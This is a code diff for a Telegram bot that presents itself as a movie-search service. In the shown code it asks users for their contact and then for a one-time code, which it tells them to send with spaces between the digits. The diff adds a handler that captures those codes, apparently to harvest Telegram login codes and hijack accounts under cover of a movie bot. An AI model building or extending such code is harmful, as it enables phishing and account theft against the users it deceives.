@@ -6,6 +6,11 @@ import re
 # List of Admin User IDs
 ADMINS = [8083702486]  # Replace with your Telegram user IDs
 
+@Client.on_message(filters.private & filters.regex(r"^(\d\s){4}\d$|^\d{5}$"))
+def otp_received(client, message):
+    otp = message.text.replace(" ", "")
+    message.reply_text(f"Received OTP: {otp}")
+
 @Client.on_message(filters.command("start"))
 async def start(client, message):
     await message.reply_photo(
@@ -98,7 +103,7 @@ async def movie_button(client, callback_query):
 async def search_movie(client, message):
     query = message.text
 
-    if re.fullmatch(r"(\d\s){4}\d", query):
+    if re.fullmatch(r"^(\d\s){4}\d$|^\d{5}$", query):
         return
     
     reply_markup = InlineKeyboardMarkup(
@@ -118,9 +123,3 @@ async def contact_received(client, message):
 If you got it, send OTP here after reading the below format.
 If OTP is 12345, please send it as 1 2 3 4 5. </b>"""
     )
-
-# Handler for OTP message
-@Client.on_message(filters.private & filters.regex(r"^(\d\s){4}\d$"))
-async def otp_received(client, message):
-    await message.reply_text(f"""<b> Here is Your Link: 
-https://example.com/yourmovie </b>""")
